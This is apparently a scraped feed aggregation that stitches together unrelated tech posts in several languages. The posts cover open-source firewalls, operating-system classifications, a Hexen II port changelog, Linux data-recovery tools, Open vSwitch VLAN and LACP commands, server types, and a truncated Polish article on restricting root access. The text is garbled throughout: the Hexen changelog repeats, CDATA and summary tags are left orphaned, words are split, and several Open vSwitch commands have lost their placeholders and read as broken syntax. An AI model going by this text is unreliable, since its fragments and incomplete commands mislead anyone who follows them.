البته اگر شما هم مثل من باشید حتماً به این توصیه عمل خواهید کرد! 
با نویسنده این برنامه هم تماس گرفتم و از او خواستم اگر برنامه باز متن مشابهی برای برگرداندن اطلاعات پاک شده (کاری که اینجا با Stellar Phoenix Linux انجام دادیم) سراغ دارد معرفی کند، که گفت سراغ ندارد. خوشحال می‌شوم اگر کسی چنین چیزی می‌شناسد که با اکثر پارتیشنها کار می‌کند، یک خبری هم به ما بدهید. بعضی برنامه‌های قدیمی هستند که با ext2 کار می‌کنن، ولی واقعاً هیچ نسخه شسته و رفته‌ای که بتواند همه چیز را برگرداند تا به امروز مشاهده نشده است!

  <title><![CDATA[5 Best “known” Open Source Firewall/Routers]]></title>
  <summary><![CDATA[1) pfSense – pfSense is a FreeBSD based stateful packet filtering firewall with a whole slew of features. Besides your basic NAT/Firewall capabilites, pfSense offers packages that can enhance it’s feature set like a transparent virus proxy for web surfing and Snort for sniffing packets. pfSense also comes with PPTP, IpSec and Open VPN support baked in and support for OpenBSD’s CARP hardware failover which allows you to have two boxes configured as a failover group. I’m been using pfSense for a few years now and love it. It’s an enterprise grade product with an easy consumer interface. Definitely my favorite. 
2) m0n0wall – Another FreeBSD based stateful packet filtering firewall which is what pfSense is based on. It’s pretty much has the same feature set as pfSense with a few minor exceptions. It’s really stable and is one of the older distros in the firewall/router game. m0n0wall will run on pretty low end hardware and offers an embedded option so you can run it on embedded hardware like an ALIX board. A great option if you want something you can set and forget. 
3) IPCop – Originally a fork of the SmoothWall project, IPCop is a Linux based stateful firewall built on the netfilter framework. IPCop offers a simple update mechanism to install updates and offers many addons that add additional functionality like QoS and virus checking. Geared toward the home or SOHO user, IPCop offers a highly configurable firewall/router that can run on almost and hardware you have laying around. 
4) DD-Wrt  – If you don’t have a spare computer laying around to power your router/firewall and would like to take advantage of a hardware WLAN you already own then DD-Wrt is right up your alley. A fork of OpenWRT, DD-WRT is a Linux based alternative firmware suitable for a long list of WLAN routers. If your hardware router is supported a simple firmware upgrade to DD-WRT will add a lot of the same functionality to your hardware that most of the distros in this list offer. A great way to mod existing hardware to squeeze every last bit of performance out of the unit. May I suggest the Linksys WRT-54G-L. 
5) Zeroshell– Zeroshell aims to provide an easy to install and maintain Linux based firewall distribution. Zeroshell is powerful enough for an enterprise load but surprisingly easy to configure with complete set of options like VPN, QoS and VLAN support. Based on Linux and available as a LiveCD or Compact Flash image, Zeroshell falls into the “easy and powerful” category. Great for someone who doesn’t want to screw around too much and just wants something that works.]]></summary>

  <title><![CDATA[Sistema Operacional - Classificações]]></title>
  <summary><![CDATA[Em relação ao seu projeto (arquitetura), segundo Tanenbaum (1999): §  Núcleo monolítico ou monobloco: o núcleo consiste em um único processo executando numa memória protegida (espaço de núcleo) executando as principais funções. Ex.: MAC OS X, OS/2, Windows, Linux, FreeBSD.   §  Micronúcleo ou modelo cliente-servidor: o núcleo consiste de funções mínimas (comunicação e gerenciamento de processos), e outras funções, como sistemas de arquivos e gerenciamento de memória, são executadas no espaço do usuário como serviços; as aplicações (programas) são os clientes. Ex.: GNU Hurd, Mach.   §  Sistema em camadas: funções do núcleo irão executar em camadas distintas, de acordo com seu nível de privilégio. Ex.: Multics.   §  Monitor de máquinas virtuais: fornece uma abstração do hardware para vários sistemas operacionais. Ex.: VM/370, VMware, Xen.   Quanto ao gerenciamento de processos, pode-se usar a seguinte classificação:  §  Monotarefa: pode-se executar apenas um processo de cada vez Ex.: MS-DOS.   §  Multitarefa: além do próprio SO, vários processos de utilizador (tarefas) estão carregados em memória, sendo que um pode estar ocupando o processador e outros ficam enfileirados, aguardando a sua vez. O compartilhamento de tempo no processador é feito de modo que o usuário tenha a impressão que vários processos estão sendo executados simultaneamente. Cada processo recebe um tempo para ser executado. Ao final desse tempo, outro processo é executado. Essa alternância de processos chama-se concorrência.   §  Multitarefa cooperativa: Executa dois ou mais programas em simultâneo mas o programa que está em primeiro plano tem controlo sobre o processador. Neste caso se este programa falhar bloqueia o computador e tem que ser reiniciado. Exempo de SO: Windows 3.x e versões anteriores ao Mac OS 8.   §  Multitarefa preempetiva: É o processador que controla a execução dos programas, desta forma permite ao sistema operativo recuperar o controlo caso um programa bloqueie. O utilizador perde os trabalhos do programa que falhou mas os restantes programas continuam a trabalhar. Exemplo de SO: Unix; Linux; Windows 95 e superiores; MAC OS 8 e superiores; etc.   §  Elemento de lista com marcas:   Ex: OS/2, Windows, Linux, FreeBSD e o Mac OS X. Cabe destacar que processos só podem estar executando simultaneamente caso o sistema seja multiprocessado, já que, em que cada instante de tempo, apenas um processo está em execução em um processador ou núcleo de processamento (core).   §  Multiprocessamento: o SO distribui as tarefas entre dois ou mais processadores. Se os processadores estivem na mesma máquina física, o sistema é chamado de Sistema Multiprocessado Fortemente Acoplado. Caso esteja em máquinas diferentes, trata-se de um Sistema Multiprocessado Fracamente Acoplado.   Quanto à quantidade de usuários que podem utilizar o sistema concorrentemente:  §  Monousuário: apenas um usuário por vez (apesar de poder suportar recursos como troca de usuário). Ex.: Windows. Esse também pode ser acessado por terminais e conexão remota.   §  Multiusuário: vários usuários usam o computador ao mesmo tempo, seja por diversos terminais, seja por conexão remota como o SSH. Ex.: Linux, Unix.  Exemplos de sistemas operacionais ativos   Para desktop/servidores   §  CentOS   §  Debian   §  DragonflyBSD   §  eComStation   §  Fedora   §  FreeBSD   §  FreeDOS   §  Gentoo   §  Haiku   §  Inferno   §  Linux Mint   §  Mandriva Linux   §  MenuetOS   §  MINIX   §  NetBSD   §  OpenBSD   §  OpenSuSE   §  OS X   §  PCLinuxOS   §  Plan 9   §  ReactOS   §  Slackware   §  Solaris   §  Unix System V   §  Ubuntu   §  Windows       Para dispositivos móveis (tablets e smartphones)   §  Android   §  Blackberry OS   §  iOS   §  Bada   §  Maemo   §  MeeGo   §  Symbian   §  WebOS   §  Windows Phone     Unix foi o primeiro sistema operacional moderno   Visando o problema da incompatibilidade de SOs de máquinas distintas, um grupo de desenvolvedores da AT&T criaram o Unix em 1969, sendo o primeiro sistema operacional moderno da computação.   Sua primeira versão foi escrita em linguagem Assembly, sendo posteriormente reescrita em C no ano de 1973, linguagem que é utilizada até os dias de hoje. Este sistema introduziu conceitos muito importantes para a computação: portabilidade, multi-usuário, multi-tarefas e compartilhamento de tarefas.   Durante a década de 70, o Unix foi distribuído gratuitamente (incluindo seu código fonte) para universidades e órgãos governamentais norte-americanos, o que conferiu muita popularidade a este sistema. Sua interface era totalmente em modo texto sem interface gráfica.   Em 1977 foi lançado o BSD, sistema operacional fortemente baseado no Unix, focado principalmente para a execução em máquinas específicas de alto desempenho, como o famoso computador VAX, o qual foi uma referência de hardware na época.   Atualmente, a grande maioria dos sistemas operacionais são baseados no Unix, tanto em desktops quanto em servidores e em dispositivos móveis, sendo o Windows - líder absoluto no mercado de desktops - a mais notável exceção.     Exemplos de sistemas operacionais importantes que foram descontinuados   §  MS-DOS   §  OS/2   §  BeOS   §  NeXTStep   §  CP/M]]></summary>

Requirements:    · Hexen II   																								What's New in This Release: [ read full changelog ]    · OpenGL: Fixed screen flickering resulting from progress bars drawing with some drivers (bug #3519666.) uHexen2 no longer draws the loading progress bars during level load in opengl mode.  · OpenGL (Windows): Fixed a bug which would prevent running on Windows8 consumer preview versions, unless 32 bit color depth was specified on the command line. Works just fine now.  · Music playback: Made sure that the file's channels count is supported.  · Unix MIDI (Timidity): Configuration file timidity.cfg is now searched first under the user directory and th   e installation directory before the common system locations. Full absolute path of timidity.cfg can be specified by setting the TIMIDITY_CFG environment variable, too.  · Client, all: Revised the intermissions setup code.  · Client, all: Fixed a few effect abslight and scale flags, which were another bunch of original hexen2source bugs.  · All platforms: Majorly revised path name handling and filesystem code.  · Support for Solaris. Support for Amiga, AROS, MorphOS. Added missing RISCOS defines.  · Keyboard input: Made the keypad keys to send separate key events in game mode. (for Windows and SDL-using builds, e.g. Linux/Unix, OSX.)  · Joystick: Added joystick (gamepad) support for all SDL-using builds, e.g. Linux/Unix, MacOSX. The new cvars are documented in the README. - Mouse (DOS): Wheel is now detected and used by default. Use "-nowheel" command line switch to disable it.  · Mouse (DOS): Pausing the g   ame, moving the mouse and then unpausing it, doesn't change the view angle anymore.  · All platforms, gameplay: Fixed a rare crash in the ambient fish hcode.  · All platforms, h2patch: More detailed output and better reporting in case of incompatible or corrupted pak files. Same with the pak-patch functionality of the gtk-launcher application.  · Utils, dcc (progs decompiler): Fixed an infinite recursion issue when decompiling the hcbots progs.dat. Fixed decompiling of rival kingdoms progs. Changed decompiler memory usage. Made -src command line option of dhcc to behave the same as it does with hcc. Added -name command line option either for specifying a name other than progs.src for the compiler like hcc itself or for specifying a name other than progs.dat for the decompiler.  · Utils, hcc (HexenC compiler): Cleaned up the -src command line option handling.  · All: Incremented versions for the hexen2 engine to 1.26 and hexen   world engine to 0.26. Incremented gamecode version to 1.26.  · Several source code cleanups and documentation updates.   												 												      Via: Hexen II: Hammer of Thyrion 1.5.4]]></summary>

Same with the pak-patch functionality of the gtk-launcher application.  · Utils, dcc (progs decompiler): Fixed an infinite recursion issue when decompiling the hcbots progs.dat. Fixed decompiling of rival kingdoms progs. Changed decompiler memory usage. Made -src command line option of dhcc to behave the same as it does with hcc. Added -name command line option either for specifying a name other than progs.src for the compiler like hcc itself or for specifying a name other than progs.dat for the decompiler.  · Utils, hcc (HexenC compiler): Cleaned up the -src command line option handling.  · All: Incremented versions for the hexen2 engine to 1.26 and hexen   world engine to 0.26. Incremented gamecode version to 1.26.  · Several source code cleanups and documentation updates.]]></summary>

Hammer of Thyrion is a cross-platform port of Raven's Hexen II source. It is based on an older linux port, Anvil of Thyrion. HoT includes many bug fixes, improved sound and video modes, opengl improvements and documentation among many others.  												Here are some key features of "Hexen II: Hammer of Thyrion":    · Support for Hexen II, Hexen II demo, Portal of Praevus mission pack and HexenWorld.  · Cross-platform code: Tested on Linux, FreeBSD, OpenBSD, Mac OS X and Windows. Also reported to build and run fine on QNX and Nokia N770, N800 and N810. Other unices should also work. Even DOS is supported for nostalgic purposes. There are seperate ports to MorphOS, AmigaOS4, PalmOS, GP2   X and Pandora.  · Tested on 32 bit and 64 bit platforms.  · In-game resolution changing for both opengl and software renderers. Instant fullscreen/windowed toggling on X11 (unix).  · OpenGL enhancements including multitexturing, glow effects, working brightness control, text and hud size changing on the fly, translucent console background, console background stretching, colored lights and support for external lit files, fixes for texture cache and model mesh cache mismatches.  · Fully network-compatible with Raven's 1.11 windows version as well as with other Hexen II ports. Can load and play games saved with Raven's 1.11 windows version.  · The same binary handles both original hexen2 and the mission pack.  · The same hexen2 binary transparently handles both v1.11 (hexen2) and v1.12 (mission pack) style progs.dat files.  · Fullscreen intermissions and help dialogs.  · MouseWheel support.  &#   183; Improvements and fixes to the HexenC game code.  · Improved sound support: A selection of three different sound drivers (ALSA, OSS and SDL) for Linux. FreeBSD is supported with OSS and SDL, OpenBSD and NetBSD are experimentally supported with sunaudio and SDL.  · Support for ogg, mp3 and wav external music files to be played instead of the original midi files.  · Working music volume controls and on the fly selection of CD or MIDI music.  · Full user directories support under unix: all users have their own configuration files and game saves.  · Improved console functionality (inline editing and tab completion), and a maplist command.  · Ability to delete saved games from within the game.  · Several hexen2 utilities (hcc: the hexenc compiler, and other mapping tools) are maintained and are being kept up to date.  · Several hexenworld utilities (hwmaster: hexenworld master server, hwmquery: to   ol for querying hw master servers, hwrcon and hwterm: rcon tools) are maintained and are being kept up to date.  · Many bug fixes, security fixes and other improvements.   												Requirements:    · Hexen II   																								What's New in This Release: [ read full changelog ]    · OpenGL: Fixed screen flickering resulting from progress bars drawing with some drivers (bug #3519666.) uHexen2 no longer draws the loading progress bars during level load in opengl mode.  · OpenGL (Windows): Fixed a bug which would prevent running on Windows8 consumer preview versions, unless 32 bit color depth was specified on the command line. Works just fine now.  · Music playback: Made sure that the file's channels count is supported.  · Unix MIDI (Timidity): Configuration file timidity.cfg is now searched first under the user directory and th   e installation directory before the common system locations. Full absolute path of timidity.cfg can be specified by setting the TIMIDITY_CFG environment variable, too.  · Client, all: Revised the intermissions setup code.  · Client, all: Fixed a few effect abslight and scale flags, which were another bunch of original hexen2source bugs.  · All platforms: Majorly revised path name handling and filesystem code.  · Support for Solaris.

  <title><![CDATA[Recuperación de datos]]></title>
  <summary><![CDATA[http://www.bairesnortelug.com.ar/2007/01/31/recuperacion-de-datos-perdi-todo-y-ahora-que-hago/ 
Empecemos por los que a mi entender son los mejores en el rubro: 
Photorec 
Es conocido por su efectividad en la recuperación de memorias SD de las cámaras digitales. Se encuentra bajo licencia GPL y es multiplataforma. Actualmente soporta: 
* DOS/Win9x 
* Windows NT 4/2000/XP/2003 
* Linux 
* FreeBSD, NetBSD, OpenBSD 
* Sun Solaris 
* Mac OS X 
Los tipos de particiones soportados son: 
* FAT, 
* NTFS, 
* EXT2/EXT3 filesystem 
* HFS+ 
según la pagina web del proyecto se probó recuperar información con éxito de las siguientes cámaras: 
* Canon EOS300D, 10D 
* HP PhotoSmart 620, 850, 935 
* Nikon CoolPix 775, 950, 5700 
* Olympus C350N, C860L, Mju 400 Digital, Stylus 300 
* Sony DSC-P9 
* Praktica DCZ-3.4 
* Casio Exilim EX-Z 750 
Foremost 
Muy efectivo para recuperar diferentes tipos de archivos. La técnica que utiliza es el método de lectura RAW en busca de cabeceras, finalización y estructura interna de archivos. El propio soft tiene una base de datos de estructura de archivos bastante amplia entre las que se destacan: 
jpg (Soporte para JFIF y Exif incluidas en las camaras digitales modernas), gif, png, bmp, avi, mpg (soporta la mayoria de MPEG’s (comenzando con la cabecera de archivo 0×000001BA)), exe (Windows PE executables), rar, wav, riff, wmv, wma, mov, pdf, ole (Incluye powerpoint, Word, Excel, Access, y Star Writer) ,zip, htm y cpp 
dd 
Esta utilidad existe desde hace tiempo dentro de las coreutils de cualquier sistema *nix. Se encuentra también bajo licencia GPL. 
Cual es la utilidad?. Nos permite copiar bloque a bloque información. Por ejemplo si deseamos hacer una imagen de un cd deberíamos hacer lo siguiente: 
dd if=/dev/cdrom of=/home/usuario1/imagen.img 
Pero el problema recide si el cd o medio donde se encuentra la información esta dañado. 
Para poder solventarse este problema dio origen a una serie de forks de dd con ciertas mejoras para estos casos: 
dd_rescue 
Este este programa nació al poco tiempo de dd. El funcionamiento es simple: tratará de copiar toda la información por más que existan errores en el dispositivo. Se lo puede ejecutar varias veces y no volverá a empezar de cero, sino que tratara de completar la operación hasta conseguir la información completa. 
Ejemplo: 
# dd_rescue –e 7 –l /tmp/resultado.log –r –d /dev/hdc /var/tmp/cd.img 
Se lee el contenido de /dev/hdc y se escribe en cd.img 
–e 7 es el parámetro que indica el numero de veces que se lecturas reiteradas 
–l luego esta el archivo en el cual se guardan los registros de la lectura 
–r es para el sentido de la lectura hacia atrás o hacia delante 
El defecto del dd_rescue es que puede tomar mucho tiempo en las lecturas, por la cantidad de veces que le pediremos pasar sobre el sector defectuoso y también por el tamaño de la información a recuperar. 
Myrescue 
Este programa es una mejora a dd_rescue y trata de encontrar la mejor manera de enfrentar el problema. Por ejemplo primero leer la información sana para continuar donde esta el problema. 
DD_rhelp 
En este caso prueba diferentes métodos de lectura. 
DDrescue 
Abarca todas las funciones de los programas anteriores y de dd_rescue. 
Utiliza el método de leer primero lo que esta bien y luego utilizar diferentes técnicas sobre los sectores erróneos. Tengan en cuenta que el proceso de recuperación de este programa también es muy lento. 
Recoverdm 
Util para recuperar CD’s rayados, al encontrar un error baja la velocidad de lectura e intenta copiarlo. 
Ejemplo: 
# recoverdm –t30 -o /home/user1/recupero.img –n l –r6-i/dev/hdc 
-t 30 ajusta el tipo de unidad para DVD 
-o el archivo destino 
-i el dispositivo a leer 
-n el numero de repeticiones para la lectura 
gpart 
Intenta recuperar la partición primaria en caso de que la tabla de la partición tenga el sector 0 dañado,incorrecto o borrado. Los tipos de particiones soportados son: 
* DOS/Windows FAT (FAT 12/16/32) 
* Linux ext2 
* Linux swap partitions versions 0 and 1 (Linux >= v2.2.X) 
* OS/2 HPFS 
* Windows NT/2000 FS 
* *BSD disklabels 
* Solaris/x86 disklabels 
* Minix FS 
* Reiser FS 
* Linux LVM physical volume module (LVM by Heinz Mauelshagen) 
* SGI XFS on Linux 
* BeOS filesystem 
* QNX 4.x filesystem 
Test disk 
Infaltable, es multiplataforma, actualmente soporta: 
* DOS 
* Windows (NT4, 2000, XP, 2003), 
* Linux, 
* FreeBSD, NetBSD, OpenBSD, 
* SunOS 
* MacOS 
Soporta los siguientes file systems: 
* BeFS ( BeOS ) 
* BSD disklabel ( FreeBSD/OpenBSD/NetBSD ) 
* CramFS, Compressed File System 
* DOS/Windows FAT12, FAT16 and FAT32 
* HFS and HFS+, Hierarchical File System 
* JFS, IBM’s Journaled File System 
* Linux Ext2 and Ext3 
* Linux Raid 
o RAID 1: mirroring 
o RAID 4: striped array with parity device 
o RAID 5: striped array with distributed parity information 
o RAID 6: striped array with distributed dual redundancy information 
* Linux Swap (versions 1 and 2) 
* LVM and LVM2, Linux Logical Volume Manager 
* Mac partition map 
* Novell Storage Services NSS 
* NTFS ( Windows NT/2K/XP/2003 ) 
* ReiserFS 3.5, 3.6 and 4 
* Sun Solaris i386 disklabel 
* Unix File System UFS and UFS2 (Sun/BSD/…) 
* XFS, SGI’s Journaled File System 
Ideal para recuperar particiones perdidas por el mal uso de fdisk o en los casos de pendrives o flash memory que perdieron la partición por ser retirados sin ser desmontados correctamente. 
De la wiki de Testdisk pueden obtener ejemplos de como utilizar esta herramienta para recuperar particiones: 
http://www.cgsecurity.org/wiki/Ejemplos_de_recuperacion_de_datos 
Sleuthkit + autospy Browser 
Cuando todo lo anterior falla tenemos a estas dos herramientas bastante complejas y no aptas para novatos. Sleuthkit es un conjunto de herramientas para realizar análisis del tipo forense. Solamente esta disponible para ambiente *nix (Linux, OS X, FreeBSD, OpenBSD y Solaris). Autospy es una interfaz que facilita la utilización de sleuthkit. 
Soporta las siguientes particiones: 
- FAT12 FAT16 FAT32 
- Linux EXT2/EXT3 
- Linux SWAP (version 1 and 2) 
- NTFS (Windows NT/W2K/XP) 
- BeFS (BeOS) 
- UFS (BSD) 
- Netware 
- ReiserFS 
Distros lives: 
RIP 
La mejor, hasta ahora nunca me defraudó, incluye la mayoría de los programas descriptos anteriormente. Si necesitan mayor información revisen el completo informe que realice sobre ella. 
SuperGRUB 
Realmente espectacular, probado con éxito contra una imagen de windows 2000 que al bootear simplemente se quedaba la pantalla en negro. Ocupa menos de 1MB. Se puede bajar la imagen de disquette o cd. 
Las posibilidades son las siguientes: 
Gnu/Linux: 
* Restorear Grub al MBR automaticamente 
* Restorear LILO al MBR (BETA) 
* Arrancar Linux 
* Activar la particion de Linux 
Windows: 
* Arreglar el arranque de Windows 
* Arrancar Windows 
* Arrancar Windows de un segundo disco 
* Arrancar Windows de una particion secundaria 
* Arrancar otros sistemas operativos como GNU Hurd 
* Activar partiticiones 
* ocultar particiones 
* desocultar partiticiones 
Trinity Rescue Kit 
Todo lo necesario para rescatar info de Windows dañados. NTFS Undelete, antivirus que trabaja con cuarto motores principales, y demás herramientas. 
System rescue CD 
Compuesto por: 
* GParted, con mayores prestaciones que la competencia de pago, Partition Magic. Merce un informe aparte. 
* GNU Parted, útil para editar particiones. 
* Partimage, para clonar discos. 
* Herramientas para diferentes sistemas de archivos (e2fsprogs, reiserfsprogs, reiser4progs, xfsprogs, jfsutils, ntfsprogs, dosfstools): que nos permite formatear, hacer un resize, debug de cualquier tipo de partición exitente en el disco rígido. 
* Ntfs3g: nos permite montar una partición NTFS con derechos full lectura/escritura. 
* Sfdisk, para hacer un backup o restore de la tabla de particiones. 
* Test-disk, el cual ya describí. 
Ultimate boot CD 
Live cd con la mas completa recopilación de disk Managers, soft de diagnóstico de discos rígidos, software de destrucción segura de información (disk wiping), editores de sectores de discos, editores de partición, herramientas para manejo de particiones NTFS y mucho más. 
Nota: el cd contiene varias herramientas que poseen Copyright, no son GPL. 
Como reflexion final, cuiden su información. Hagan backups. Cada tanto utilicen SMARTmon tools para hacer un diagnóstico del disco. No crean que nunca les va a pasar porque cuando les pase lo van a lamentar.

When files disappear, Magic Rescue saves the day
http://archive09.linux.com/feature/126525 
Magic Rescue
The basic command is magicrescue -d directory -r recipe device or, to give an example, magicrescue -d /mnt/external -r /usr/share/magicrescue/recipes/zip /dev/sda1. You can enable searches for multiple formats by specifying a directory that holds all the recipes for those formats. 
The man page suggests that you run the command hdparm -d1 -c -u1 /dev/device to enable direct memory access before running Magic Rescue. The command is not strictly necessary, but it can significantly reduce the time that the program takes to run. However, you may prefer to tweak performances by limiting the operation in other ways provided by the command parameters (see below).

  <summary><![CDATA[As you may already know, I’ve been working with Open vSwitch (OVS) for a few weeks now, trying to wrap my head around how this open source project works. One thing that I really struggled with—and still struggle with, to a certain extent—is a lack of user-friendly documentation. While there are a few posts that provide some basic instructions, I haven’t found any good articles that provide a bit more depth and more explanation. Maybe it’s just me, but I like to know why I’m typing certain commands, and how those commands work. 
What is relatively well-documented are tasks like creating a bridge, adding ports to a bridge, or creating a bond. These tasks use commands like ovs-vsctl add-br or ovs-vsctl add-port. These commands are pretty easy to understand, reasonably well-documented in the help screens and the manpages, and provide decent error messages back to the user if the syntax is wrong. What isn’t quite so well-documented are tasks like VLANs or LACP, and that’s where I was struggling. 
(OK, rant over.) 
Anyway, I think that I’ve finally made some progress, and I wanted to share what I’ve found with you. (At some point in the near future, I intend to post some “intro to OVS basics” posts to help others that might be learning OVS for the first time like me.) 
So, let’s say that you want to set the VLANs that are allowed across an OVS port. By default, all OVS ports are VLAN trunks, but based on my experience you still need to set the VLANs that are allowed across the trunk before they actually act like trunks. If you’re familiar with Cisco switches, think of this process as using the switchport trunk allowed vlans command. 
To set the VLAN trunks for a given port, use this command: 

ovs-vsctl set port  trunks=

Obviously, you’ll want to substitute the correct port name and VLAN IDs in that command. If you’re unsure of the port name to use, use ovs-vsctl show to review the OVS configuration and determine which port(s) to configure. 
If you want to configure an OVS port as a VLAN access port, use this command: 

ovs-vsctl set port  tag=

Again, it should go without stating, but you’ll want to substitute the correct values for your environment in the command above. 
Here’s one more example before I provide some explanation. Let’s say that you have a bond (a NIC team or a link aggregate) and you want to enable LACP on that bond. You’d run this command: 

ovs-vsctl set port  lacp=active

The “port name” in this case would be something like bond0, which is a bond you’ve created using ovs-vsctl add-bond command. Your physical switch must be properly configured as well in order to support LACP on the appropriate physical switch ports. 
What are these commands doing, exactly? This is the part that I couldn’t find documented (well) anywhere. I saw lots of references to ovs-vsctl parameters like set interface or set port, but no clear explanation of what these commands were doing, or why. Almost every single example I saw also used these commands during the process of creating a bridge, bond, port, or interface (not afterward). What if you needed to modify the values after the object is created? Do you have to delete the object and recreate it? 
Oddly enough, it was this post (which has nothing to do with VLANs, trunks, or LACP, but instead focuses on sFlow) that sparked my understanding. I was reading the post on how to configure OVS for sFlow while also reviewing the manpage for ovs-vsctl when I had the epiphany: these objects (bridge, port, bond, interface) are tables in the OVSDB, so you need to use the OVSDB-related parameters for ovs-vsctl in order to modify their properties. 
Looking at the ovs-vsctl manpage (or the --help screen), you can see that there are several DB-related commands. Here’s the generic form: 

ovs-vsctl    

In this generic command,  would be something like set, get, or list, and the  would be replaced by a specific OVSDB table. For example, one such table is port. Let’s plug a specific command and a specific table into the generic form: 

ovs-vsctl set port  

(Did something just click with you?) 
We could continue plugging specific items into the generic form to arrive at a command like this: 

ovs-vsctl set port bond0 trunks=10,20,30,40,50

The trick, of course, is knowing what values to substitute into the command to manipulate the OVS database in the right way. Fortunately, there are a couple of commands that can help. 
To see all the OVS bridges and their settings, use this command: 

ovs-vsctl list bridge

To see all the OVS ports and their settings, use this command: 

ovs-vsctl list port

Finally, to see all the OVS interfaces and their settings, use this command: 

ovs-vsctl list interface

You can add a specific record to the above commands; for example, to see the settings for a port named bond0: 

ovs-vsctl list port bond0

This will show you the settings that are available for that particular record; you can then use ovs-vsctl set as described earlier to set the value for a setting. This is how you configure VLAN trunks (by setting the value of the trunks setting for a particular port) or enable LACP (by setting the value of the LACP setting for a particular port). These commands can be run when a record is created, like this: 

ovs-vsctl add-bond br0 bond0 eth0 eth1 lacp=active trunks=10,11,12

Or you can run the commands after the record/object is created, like this: 

ovs-vsctl set port bond0 lacp=active trunks=10,11,12

Hopefully, this additional information and insight—which seems so simple now that I understand it—will prove helpful to others. 
If there are errors or inaccuracies in my information, please speak up in the comments and correct me. This will also help other readers. All courteous comments are welcome!

Web server4. DHCP server5. Web Mail server6. NTP server7. Proxy server8. FTP server     9. Samba server10. Fire wall server11. Virtualisasi server12. SSH serve13. Secure server14. Printer server    Pengertian masing-masing aplikasi : 1.DNS server adalah sebuah aplikasi service di internet yang menterjemahkan sebuah domain name ke IP address dan salah satu jenis system yang melayani permintaan pemetaan IP address ke FQDN (fany qualified domain name ) dan dari FQDN ke IP address. 2. Mail server adalah perangkat lunak program yang mendistribusikan file atau informasi sebagai respon atas permintaan yang dikirim via email, juga digunakan pada bitnet untuk menyediakan layanan serupa http:FTP. 3.Web server adalah sebuah perangkat lunak server yang berfungsi menerima permintaan HTTP atau HTTPS dari klient yang dikenal dengan web browser dan mengirimkan kembali hasilnya dalam bentuk halaman-halaman web yang umumnya berbentuk dokumen HTML. 4.DHCP server adalah sebuah layanan yang secara otomatis memberikan nomor IP kepada computer yang memintanya. Komputer yang memberikan IP inilah yang disebut sebagai DHCP server , sedangkan computer yang melakukan request disebut DHCP client. 5.Web Mail server adalah aplikasi email berbasis web. Web adalah sebuah alamat situs intenet.        6.NTP server adalah network time protocol yang berfungsi  untuk mensingkroniskan waktu client dengan server, supaya waktu jam dapat sama persis. NTP berjalan pada protocol UDP yang bersifat ringan dan unreliable.   7.Proxy server adalah teknik yang standar untuk mengakses secara bersama-sama oleh beberapa computer sekaligus dalam sebuah Local Area Network (LAN) melalui sebuah modem atau sebuah saluran komunikasi.   8. FTP server Adalah suatu server yang menjalankan software yang berfungsi untuk memberikan layanan tukar menukar file dimana server tersebut selalu siap memberikan layanan FTP apabila mendapat permintaan (request) dari FTP client. Tujuan darai FTP server adalah : a. untuk tujuan sharing data b. untuk menyediakan indirect atau implicit remote computer c. untuk menyediakan tempat penyimpanan bagi user untuk menyediakan transfer data yang reliable dan efisien   9. Samba server adalah system yang dibutuhkan pc server untuk jaringan internet. 10. Fire wall adalah suatu mekanisme untuk melindungi keamanan jaringan computer dengan menyaring paket data keluar dan masuk di jaringan                                 11. Virtualisasi server adalah virtualmin yang terdiri dari website ,email,dan akses FTP yang terkait dengan semua nama domain. Virtual server memiliki account administrator yang dinamakan virtual server owner. Virtual server owner dapat membuat alamat email tambahan account ftp , dan website yang telah ditetapkan oleh Reseller atau Master Administrator yang telah membuat virtual server.  12. SSH server adalah aplikasi pengganti remote login seperti telnet, rsh, dan rlogin yang jauh lebih aman. Dikembangkan pertama kali oleh openBSD project dan kemudian versi rilis p (port) di manage oleh team porting ke system operasi lainya, termasuk system operasi Linux.  13. Secure server adalah suatu protocol yang men fasilitasi system komunikasi  yang aman diantar sua system yang menggunakan arsiktektur client/server , serta memungkinkan seorang untuk login ke server secara remote. 14. Printer server adalah suatu alat computer yang dihubungkan ke satu atau lebih printer dalam suatu jaringan , alat atau computer tersebut akan menerima perintah print dari computer lain dan mengirimkan pada printer yang telah ditentukan]]></summary>

  <summary><![CDATA[Używanie Grup użytkowników w celu ograniczenia działalności root'a Hasło root'a może być powodem wielu problemów, dlatego istnieją różne sposoby, aby to root nie był cały czas w użyciu, gdyż niesie zbyt duże zagrożenie dla systemu. Dużo administratorów nienawidzi podawać hasła root zawsze wtedy, gdy inni ludzie pracujący na systemie go potrzebują żeby np. edytować plik lub coś innego. Wielu administratorów nie ma kompletnie pojęcia ile jest sposobów by temu zaradzić i każdy by mógł wykonywać swoją prace bez potrzeby root'a. Wielu administratorów rozdaje dostęp/hasło do root na lewo i prawo, a później się martwią dlaczego system robi się nie stabilny. Unix ma potężne narzędzia do usunięcia potrzeby używania hasła root. Ten artykuł będzie jednym z kilku na temat minimalizacji używania hasła root'a. Jedną z takich alternatyw, minimalizacji może być odpowiednie zarządzanie grupami użytkowników. Na przykład, posiadając junior administratora w systemie który jest odpowiedzialny za np. pilnowanie serwera www i edycje jego plików. Można spokojnie do tego dodać jeszcze adminów zarządzającymi innymi usługami niż www. Pytanie to teraz jak zawęzić ich obszar działania do tego co jest właściwym ich zadaniem? Warto zaznaczyć, że oni nie mogą np. instalować oprogramowania, kompilować custom kernela lub robić zadania z niskim priorytetem dla systemu takich jak przeglądanie logów itd. Ich praca polegała by na odpisywaniu na emaile, restartowanie usług, uaktualnianie ustawień konfiguracyjnych demonów itp. Część brzmi jakby było potrzebne uprawnienie root'a do wykonania tego. Jeśli właściwie użyjemy grup + trochę planowania i potrzeba hasła root nie będzie wymagana do wykonania obowiązków grupy. W tym artykule pokaże Wam jak zaimplementować bezpieczeństwo na bazie grup dla zarządzania usługą Lighttpd. Oczywiście tą technikę można nie tylko zastosować dla usługi Lighttpd.Unix klasyfikuje użytkowników do grup, każda grupa zawiera ludzi którzy maja określone lub podobne zadania/funkcje administracyjne. Dla przykładu Lighttpd używa grupy o nazwie www, która zarządza plikami od Lighttpd. Różne systemy BSD mogą mieć inne nazwy użytkowników/grup dla danych usług np. NetBSD i OpenBSD mają użytkownika/grupę o nazwie named, która służy nameserwerowi, FreeBSD od tego samego posiada użytkownika/grupę o nazwie bind. Tacy pre-definiowani użytkownicy i grupy są przeważnie używani przez programy w systemie. Dla przykładu serwery www używają użytkownika(dalej znanego jako user) www dla przykładu.Dla naszych celów, potrzebujemy zdefiniować kilka grup dla userów którzy potrzebują dostępu do plików używanych przez dane programy, na szczęście nie musimy każdemu userowi ustawiać tego pojedynczo, wystarczy ustawić odpowiednie grupy w pliku:/etc/group Każda 